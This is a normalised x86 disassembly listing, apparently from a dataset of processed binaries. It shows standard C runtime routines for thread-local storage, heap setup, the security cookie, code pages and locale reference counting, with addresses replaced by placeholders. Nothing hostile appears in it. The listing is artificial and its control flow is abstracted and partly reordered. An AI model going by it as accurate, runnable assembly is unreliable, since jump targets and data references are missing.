mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_200d53c
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_200ba19
push [ rw-data ]
call sub_200d44f
push [ rw-data ]
mov [ rw-data ] eax
call sub_200d44f
push [ rw-data ]
mov [ rw-data ] eax
call sub_200d44f
push [ rw-data ]
mov [ rw-data ] eax
call sub_200d44f
add esp 0x10
mov [ rw-data ] eax
call sub_2010ca8
test eax eax
je r-xdata
test eax eax
jne r-xdata
push sub_200d76d
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_201a9e3
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call sub_200d4ca
pop ecx
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_200d5f3
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_200daa7
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_200dad7
cmp [ rw-data ] 0x3
jne r-xdata
push [ rw-data ]
call [ HeapDestroy@IAT ]
and [ rw-data ] 0x0
retn
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov edi [ HeapFree@IAT ]
jle r-xdata
push [ rw-data ]
push 0x0
push [ rw-data ]
call edi
pop edi
pop ebx
push esi
mov esi [ rw-data ]
add esi 0x10
push 0x8000
push 0x0
push [ esi - 0x4 ]
call [ VirtualFree@IAT ]
push [ esi ]
push 0x0
push [ rw-data ]
call edi
add esi 0x14
inc ebx
cmp ebx [ rw-data ]
jl r-xdata
pop esi
sub_200db54
push sub_200dbe0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_200dbe0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_200b53e
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_200b53e
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_2012cc8
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_2012c7e
mov [ ebp - 0x1 ] 0x1
test eax eax
jl r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_200b53e
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_200b53e
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_2012cae
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_2012cc8
mov eax [ ebp + 0xc ]
push rw-data
call sub_2018890
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_200b53e
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_2012c95
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_200b53e
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_200dd6c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push edi
mov edi 0xbb40e64e
mov ebx 0xffff0000
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
cmp esi edi
jne r-xdata
test ebx eax
je r-xdata
test ebx esi
jne r-xdata
mov esi 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] esi
not esi
mov [ rw-data ] esi
pop esi
mov eax esi
shl eax 0x10
or esi eax
pop edi
pop ebx
leave
retn
sub_200de02
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_200de31
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_2013580
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_200de95
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
mov dl cl
add dl 0x20
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
mov dl cl
sub dl 0x20
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_201ac89
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_2014550
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_2014550
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
inc ebx
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_2013580
add esp 0xc
mov [ esi + eax + 0x11d ] 0x0
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_200e028
push 0xc
push r--data
call sub_200db54
call sub_200d753
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e0c3
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_200db99
retn
push 0x20
call sub_200b6e7
pop ecx
cmp esi rw-data
je r-xdata
push esi
call sub_2009d98
pop ecx
sub_200e0cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_200e148
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_200e0cc
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_200de31
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_2013580
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_200b53e
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_200de02
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
inc ecx
mov [ eax ] si
inc ecx
inc eax
inc eax
dec edx
jne r-xdata
mov esi ebx
call sub_200de95
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
inc esi
inc esi
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_2013580
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_200de02
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
inc esi
inc esi
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_200e32d
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push 0x0
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
mov eax [ eax + 0x4 ]
je r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
leave
retn
sub_200e36b
push 0x14
push r--data
call sub_200db54
or [ ebp - 0x20 ] 0xffffffff
call sub_200d753
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_200e028
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_200e0cc
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_201a99e
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_200db99
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_200e148
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_2009d98
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_2009d98
pop ecx
push 0xd
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e4cc
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_2009d98
pop ecx
sub_200e52f
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_2009d98
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_2009d98
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_2009d98
push [ esi + 0xc0 ]
call sub_2009d98
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_201b115
push [ edi ]
call sub_2009d98
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_2009d98
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_2009d98
pop ecx
push [ esi + 0xb0 ]
call sub_2009d98
push [ esi + 0xbc ]
call sub_2009d98
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_2009d98
push [ esi + 0xbc ]
call sub_201b565
pop ecx
pop ecx
push eax
call sub_2009d98
pop ecx
push eax
call sub_2009d98
push [ esi + 0xbc ]
call sub_201b356
pop ecx
pop ecx
sub_200e678
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_200e707
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_200e7a0
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_200e678
pop ecx
pop edi
sub_200e7c6
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_200e678
pop ecx
test esi esi
je r-xdata
push esi
call sub_200e707
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_200e52f
pop ecx
sub_200e804
push 0xc
push r--data
call sub_200db54
call sub_200d753
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_200e7c6
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e86e
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_200d753
mov esi [ eax + 0x6c ]
mov eax esi
call sub_200db99
retn
push 0x20
call sub_200b6e7
pop ecx
sub_200e87a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
call sub_200d753
mov ecx [ eax + 0x70 ]
test cl 0x2
push 0x0
pop edx
sete dl
inc edx
mov edi edx
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
or [ rw-data ] 0xffffffff
xor esi esi
cmp edx esi
je r-xdata
mov eax edi
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_200fb13
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ eax + 0x70 ] ecx
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_200e8e4
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_200e937
push 0x8
push r--data
call sub_200db54
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_200db99
retn
push 0xd
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e9e4
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_2009d98
pop ecx
push 0xc
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_200e707
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200e9f0
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_2009d98
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_200e52f
pop ecx
sub_200ea04
push 0xc
push r--data
call sub_200db54
call sub_200d753
mov edi eax
push 0x1
push 0x8
call sub_201a9e3
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
test esi esi
jne r-xdata
call sub_200e804
call sub_200e028
mov eax [ edi + 0x6c ]
mov [ esi ] eax
mov eax [ edi + 0x68 ]
mov [ esi + 0x4 ] eax
push 0xc
call sub_2010e3c
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_200e678
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200ea9e
push 0xd
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi + 0x4 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_200eaaa
mov eax esi
call sub_200fb13
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_200db99
retn
sub_200eabb
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200acc7
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_200eafb
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_2013580
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_201cdd0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_201a591
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
